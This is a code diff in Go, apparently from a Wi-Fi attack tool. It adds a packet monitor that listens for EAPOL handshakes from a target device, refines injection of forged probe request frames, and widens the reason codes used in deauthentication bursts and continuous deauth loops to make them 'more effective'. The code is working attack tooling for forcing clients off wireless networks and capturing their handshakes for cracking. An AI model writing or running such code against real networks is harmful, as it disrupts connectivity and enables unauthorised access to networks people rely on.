@@ -35,21 +35,28 @@ func NewInjector(iface string) (*Injector, error) {
 
 // StartMonitor starts a background packet listener to detect effectiveness events.
 // It sends events ("handshake", "probe") to the provided channel.
+// StartMonitor starts a background packet listener to detect effectiveness events.
+// It opens a separate pcap handle to avoid concurrent usage issues with the injection handle.
 func (i *Injector) StartMonitor(ctx context.Context, targetMAC string, events chan<- string) {
-	// Re-open handle for listening if needed or assume handle is bidirectional (pcap.OpenLive is).
-	// We set a BPF filter to only get relevant frames.
+	// Open a new handle for monitoring
+	monitorHandle, err := pcap.OpenLive(i.Interface, 65536, true, pcap.BlockForever)
+	if err != nil {
+		log.Printf("Monitor: Failed to open handle on %s: %v", i.Interface, err)
+		return
+	}
+	defer monitorHandle.Close()
+
 	// Filter: (EAPOL) OR (Probe Request from Target)
 	// EAPOL: ether proto 0x888e
 	// ProbeReq: type mgt subtype probe-req and wlan.sa == targetMAC
-
 	filter := fmt.Sprintf("(ether proto 0x888e) or (type mgt subtype probe-req and wlan addr2 %s)", targetMAC)
 
-	if err := i.Handle.SetBPFFilter(filter); err != nil {
+	if err := monitorHandle.SetBPFFilter(filter); err != nil {
 		log.Printf("Monitor: Failed to set BPF filter: %v", err)
 		return
 	}
 
-	source := gopacket.NewPacketSource(i.Handle, i.Handle.LinkType())
+	source := gopacket.NewPacketSource(monitorHandle, monitorHandle.LinkType())
 	packets := source.Packets()
 
 	log.Printf("Monitor: Started listening for events on %s (Filter: %s)", targetMAC, filter)
@@ -93,16 +100,16 @@ func (i *Injector) BroadcastProbe(ssid string) error {
 	i.mu.Lock()
 	defer i.mu.Unlock()
 
-	// Construct Probe Request
-	// 1. RadioTap (dummy)
+	// 1. RadioTap Header (Standard 802.11 monitor mode header)
+	// We use a minimal header. Drivers usually overwrite rate/flags.
 	radiotap := &layers.RadioTap{
 		Present: layers.RadioTapPresentRate,
-		Rate:    5, // 2.5 Mbps? Not critical for injection usually, drivers override
+		Rate:    5, // 2.5 Mbps (placeholder)
 	}
 
-	// 2. Dot11 Header
-	// Probes are Mgmt frames (Type 0, Subtype 4)
-	srcMAC, _ := net.ParseMAC("02:00:00:00:01:00") // Randomized Source
+	// 2. Dot11 Header (Management Frame, Probe Request)
+	// Type: Management (00), Subtype: Probe Request (0100 -> 4)
+	srcMAC, _ := net.ParseMAC("02:00:00:00:01:00") // Randomized locally administered
 	dstMAC, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff") // Broadcast
 	bssid, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")  // Broadcast BSSID
 
@@ -111,32 +118,45 @@ func (i *Injector) BroadcastProbe(ssid string) error {
 		Address1:       dstMAC,
 		Address2:       srcMAC,
 		Address3:       bssid,
-		SequenceNumber: 0, // OS/Driver might handle this
+		SequenceNumber: i.seq, // Use internal sequence
 	}
+	i.seq++
 
-	// 3. Mgmt Layer (empty for ProbeReq structure in gopacket, payload goes into IEs)
-	// We need to build the payload manually or use Dot11MgmtProbeReq layer?
-	// gopacket layers.Dot11MgmtProbeReq is just empty struct usually.
-	// We need to append Information Elements.
+	// 3. Management Layer (Empty for gopacket, just acts as layer type holder)
+	// We don't strictly need layers.Dot11MgmtProbeReq because it has no fields,
+	// but providing it helps gopacket set the layer type correctly if we were parsing.
+	// For serialization, Dot11 layer handles the Type/Subtype fields.
 
-	// Payload: SSID Tag + Rates Tag
+	// 4. Payload (Information Elements)
+	// We must manually construct the tags:
+	// - SSID (Tag 0)
+	// - Supported Rates (Tag 1)
+	// - DS Parameter Set (Tag 3) - Channel (Optional but good) to prevent channel hop issues?
+	// - Extended Supported Rates (Tag 50)
+
 	payload := []byte{}
 
-	// SSID Tag (ID 0)
-	payload = append(payload, 0, byte(len(ssid)))
-	payload = append(payload, []byte(ssid)...)
+	// Tag 0: SSID
+	ssidBytes := []byte(ssid)
+	payload = append(payload, 0, byte(len(ssidBytes)))
+	payload = append(payload, ssidBytes...)
 
-	// Supported Rates (ID 1)
-	// 1, 2, 5.5, 11 Mbps
+	// Tag 1: Supported Rates (1, 2, 5.5, 11 Mbps basic)
+	// 0x82 (1), 0x84 (2), 0x8b (5.5), 0x96 (11) - MSB set means "Basic/Required" rate
 	rates := []byte{0x82, 0x84, 0x8b, 0x96}
 	payload = append(payload, 1, byte(len(rates)))
 	payload = append(payload, rates...)
 
-	// Buffer to write
+	// Tag 50: Extended Supported Rates (6, 9, 12, 18, 24, 36, 48, 54 Mbps)
+	extRates := []byte{0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c}
+	payload = append(payload, 50, byte(len(extRates)))
+	payload = append(payload, extRates...)
+
+	// Serialize
 	buf := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{
 		FixLengths:       true,
-		ComputeChecksums: true,
+		ComputeChecksums: true, // GoPacket calculates FCS (CRC32) at end of Dot11
 	}
 
 	if err := gopacket.SerializeLayers(buf, opts,
@@ -144,12 +164,11 @@ func (i *Injector) BroadcastProbe(ssid string) error {
 		dot11,
 		gopacket.Payload(payload),
 	); err != nil {
-		return err
+		return fmt.Errorf("serialize probe failed: %w", err)
 	}
 
 	if err := i.Handle.WritePacketData(buf.Bytes()); err != nil {
-		log.Printf("Failed to inject probe: %v", err)
-		return err
+		return fmt.Errorf("inject probe failed: %w", err)
 	}
 
 	return nil
@@ -229,7 +248,15 @@ func (i *Injector) SendDeauthBurst(config domain.DeauthAttackConfig) error {
 	ticker := time.NewTicker(interval)
 	defer ticker.Stop()
 
-	fuzzCodes := []uint16{1, 4, 8}
+	// Enhanced Fuzzing: Use more effective reason codes
+	// 1: Unspecified
+	// 2: Previous authentication no longer valid
+	// 3: Deauthenticated because sending station is leaving (or has left) IBSS or ESS
+	// 4: Disassociated due to inactivity
+	// 6: Class 2 frame received from nonauthenticated station
+	// 7: Class 3 frame received from nonassociated station
+	// 8: Disassociated because sending station is leaving (or has left) BSS
+	fuzzCodes := []uint16{1, 2, 3, 4, 6, 7, 8}
 	fuzzIdx := 0
 
 	for j := 0; j < count; j++ {
@@ -303,7 +330,8 @@ func (i *Injector) StartContinuousDeauth(ctx context.Context, config domain.Deau
 	packetsSent := 0
 	broadcast, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")
 
-	fuzzCodes := []uint16{1, 4, 8}
+	// Use same enhanced list for continuous mode
+	fuzzCodes := []uint16{1, 2, 3, 4, 6, 7, 8}
 	fuzzIdx := 0
 
 	for {
